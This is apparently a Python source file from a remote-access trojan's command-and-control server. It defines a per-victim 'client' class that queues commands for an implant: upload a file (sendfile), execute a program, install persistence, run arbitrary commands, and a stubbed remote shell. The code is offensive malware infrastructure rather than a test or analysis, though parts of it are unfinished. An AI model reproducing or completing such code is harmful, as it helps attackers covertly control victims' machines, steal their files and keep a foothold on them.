from flask import request, send_file, send_from_directory, safe_join, abort
import uuid
import time
import jwt
import os.path
import base64
import threading
import collections

class client:
    def __init__(self,uid,data="None"):
        self.uid=uid
        self.cmd=[]
        self.validCmd=False
        self.result=""
        self.cv = threading.Condition()

    def report(self,result):
        if type(result)==str:
            self.result=result
        else:
            print("recived a file")

    def getCmd(self):
        self.cv.acquire()
        while not self.validCmd:
            self.cv.wait()
        #consume item
        result=self.cmd[::]
        self.validCmd=False
        self.cv.release()

        return result

    def setCmd(self,cmdList):

        self.cv.acquire()
        #produce item
        self.cmd=cmdList
        self.validCmd=True
        self.cv.notify()
        self.cv.release()

    def openShell(self):
        print("not implemented")
        
    def sendFile(self,fname):
        self.setCmd(["sendfile",fname])

   # def downloadFile(self,fname):
   #    content=getFileContent(fname)
   #     if content!=None:
   #         self.setCmd(["writefile",fname,content])
    
    def executeProgram(self,fname):
        self.setCmd(["execute",fname])

    def installPersistency(self):
        self.setCmd(["install"])
    
    def runCommand(self,args):
        self.setCmd(["run"]+args)


    def __eq__(self,other):
        return self.uid==other.uid

    def __str__(self):
        return f"uid: {self.uid} \t cmd: {self.cmd} report: {self.result}"
    def __repr__(self):
        return self.__str__()   